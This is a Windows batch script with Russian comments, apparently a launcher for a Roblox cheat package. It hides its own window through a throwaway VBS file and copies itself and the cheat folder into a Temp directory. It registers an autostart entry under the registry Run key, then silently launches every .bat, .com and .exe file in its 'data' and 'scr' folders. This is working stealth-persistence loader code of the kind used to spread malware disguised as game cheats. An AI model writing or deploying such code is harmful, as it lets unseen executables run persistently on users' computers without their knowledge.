@echo off
:: Проверка: если скрипт запущен без флага скрытности, перезапускаем его полностью невидимым
if not "%~1"=="-hidden" (
    echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\stealth_init.vbs"
    echo WshShell.Run """%~f0"" -hidden", 0, False >> "%temp%\stealth_init.vbs"
    wscript.exe "%temp%\stealth_init.vbs"
    exit /b
)

:: Чистим за собой временный инициализатор
del "%temp%\stealth_init.vbs" >nul 2>&1

:: Включаем поддержку кириллицы в фоне
chcp 65001 >nul 2>&1

:: Настройка путей
set "ORIGINAL_DIR=C:\РОБЛОКС ЧИТ"
set "TEMP_DIR=%LOCALAPPDATA%\Temp\RobloxCheat"
set "SCRIPT_NAME=invisible_run.bat"
set "VBS_NAME=launcher.vbs"

:: 1. Создаем скрытую папку в Temp, если её еще нет
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%" >nul 2>&1

:: 2. Если есть оригинал на диске C:\ — полностью копируем/обновляем его в Temp
if exist "%ORIGINAL_DIR%" (
    xcopy "%ORIGINAL_DIR%" "%TEMP_DIR%" /E /I /Y /Q >nul 2>&1
)

:: 3. Сохраняем сам этот батник в папку Temp
copy /y "%~f0" "%TEMP_DIR%\%SCRIPT_NAME%" >nul 2>&1

:: 4. Создаем постоянный VBS-запускатор в Temp (чтобы при старте Windows вообще не было окон)
echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP_DIR%\%VBS_NAME%"
echo WshShell.Run """%TEMP_DIR%\%SCRIPT_NAME%"" -hidden", 0, False >> "%TEMP_DIR%\%VBS_NAME%"

:: 5. Прописываем в автозагрузку реестра именно VBS-скрипт (гарантия полной невидимости после перезагрузки)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RobloxCheatAuto" /t REG_SZ /d "\"%TEMP_DIR%\%VBS_NAME%\"" /f >nul 2>&1

:: 6. Определяем рабочую папку ( приоритет оригиналу, если удален — берем из Temp )
if exist "%ORIGINAL_DIR%" (
    set "WORKING_DIR=%ORIGINAL_DIR%"
) else if exist "%TEMP_DIR%" (
    set "WORKING_DIR=%TEMP_DIR%"
) else (
    exit /b
)

:: 7. Бесшумный запуск всех файлов из папки data
cd /d "%WORKING_DIR%\data" >nul 2>&1
if %errorlevel% equ 0 (
    for %%f in (*.bat *.com *.exe) do (
        if not "%%~nxf"=="%SCRIPT_NAME%" (
            start "" "%%f"
        )
    )
)

:: 8. Бесшумный запуск всех файлов из папки scr
cd /d "%WORKING_DIR%\scr" >nul 2>&1
if %errorlevel% equ 0 (
    for %%f in (*.bat *.com *.exe) do (
        if not "%%~nxf"=="%SCRIPT_NAME%" (
            start "" "%%f"
        )
    )
)

exit /b
